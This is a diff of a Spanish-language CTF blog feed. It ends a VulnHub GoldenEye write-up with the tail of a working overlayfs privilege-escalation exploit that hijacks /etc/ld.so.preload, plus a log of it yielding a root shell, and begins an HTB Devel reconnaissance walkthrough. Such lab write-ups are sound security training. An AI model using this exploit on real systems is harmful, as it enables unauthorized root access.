+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;failed to create new mount namespace&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;waitpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;waitpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;wait&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;child threads done&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/ld.so.preload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;exploit failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/ld.so.preload created&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;creating shared library&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ofs-lib.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_CREAT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;0777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lib&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;couldn't create dynamic library&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/ofs-lib.so&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm -rf /tmp/ns_sploit /tmp/ofs-lib.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/su&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;su&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Compilamos, damos permisos de ejecución y lo corremos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cc 37292.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; privesc.out
+37292.c:91:1: warning: control may reach end of non-void &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wreturn-type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+^
+37292.c:103:12: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unshare'&lt;/span&gt; is invalid &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;C99 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unshare&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CLONE_NEWUSER&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+           ^
+37292.c:108:17: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'clone'&lt;/span&gt; is invalid &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;C99 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+                clone&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;child_exec, child_stack + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1024&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1024&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, clone_flags, NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                ^
+37292.c:114:13: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'waitpid'&lt;/span&gt; is invalid &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;C99 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+            waitpid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pid, &amp;amp;status, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            ^
+37292.c:124:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wait'&lt;/span&gt; is invalid &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;C99 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    ^
+5 warnings generated.
+www-data@ubuntu:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x privesc.out 
+www-data@ubuntu:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./privesc.out 
+spawning threads
+mount &lt;span class=&quot;c&quot;&gt;#1&lt;/span&gt;
+mount &lt;span class=&quot;c&quot;&gt;#2&lt;/span&gt;
+child threads &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+/etc/ld.so.preload created
+creating shared library
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (flag.txt).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cd /root&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ls -la&lt;/span&gt;
+total 44
+drwx------  3 root root 4096 Apr 29  2018 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   19 May  3  2018 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 3106 Feb 19  2014 .bashrc
+drwx------  2 root root 4096 Apr 28  2018 .cache
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root  144 Apr 29  2018 .flag.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Feb 19  2014 .profile
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 1024 Apr 23  2018 .rnd
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 8296 Apr 29  2018 .viminfo
+&lt;span class=&quot;c&quot;&gt;# cat .flag.txt&lt;/span&gt;
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="CMS" /><category term="Web" /><category term="POP3" /><category term="CC" /><summary type="html">Resolución de la máquina GoldenEye en la plataforma de VulnHub</summary></entry><entry><title type="html">Hack The Box Jarvis</title><link href="http://localhost:4000/htb-jarvis/" rel="alternate" type="text/html" title="Hack The Box Jarvis" /><published>2021-12-31T00:00:00-06:00</published><updated>2021-12-31T00:00:00-06:00</updated><id>http://localhost:4000/htb-jarvis</id><content type="html" xml:base="http://localhost:4000/htb-jarvis/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/banner-jarvis.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;jarvis&quot;&gt;Jarvis&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.143.&lt;/p&gt;
@@ -4648,409 +5535,4 @@ C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&
 C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Powershell" /><summary type="html">Resolución de la máquina Chatterbox en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Devel</title><link href="http://localhost:4000/htb-devel/" rel="alternate" type="text/html" title="Hack The Box Devel" /><published>2021-11-26T00:00:00-06:00</published><updated>2021-11-26T00:00:00-06:00</updated><id>http://localhost:4000/htb-devel</id><content type="html" xml:base="http://localhost:4000/htb-devel/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devel/banner-devel.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;devel&quot;&gt;Devel&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.5.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.5
-PING 10.10.10.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.5: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;146 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.5 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 145.505/145.505/145.505/0.000 ms
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.5 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-27 23:03 CDT
-Initiating SYN Stealth Scan at 23:03
-Scanning 10.10.10.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 21/tcp on 10.10.10.5
-Discovered open port 80/tcp on 10.10.10.5
-Completed SYN Stealth Scan at 23:04, 26.43s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.5
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2021-08-27 23:03:49 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;26s
-Not shown: 65533 filtered ports
-Reason: 65533 no-responses
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack ttl 127
-80/tcp open  http    syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.59 seconds
-           Raw packets sent: 131086 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;880B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.5
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-   8   │ 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,80 10.10.10.5 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-08-27 23:05 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.5
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| 03-18-17  02:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
-| 03-17-17  05:37PM                  689 iisstart.htm
-|_03-17-17  05:37PM               184946 welcome.png
-| ftp-syst: 
-|_  SYST: Windows_NT
-80/tcp open  http    Microsoft IIS httpd 7.5
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/7.5
-|_http-title: IIS7
-Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-
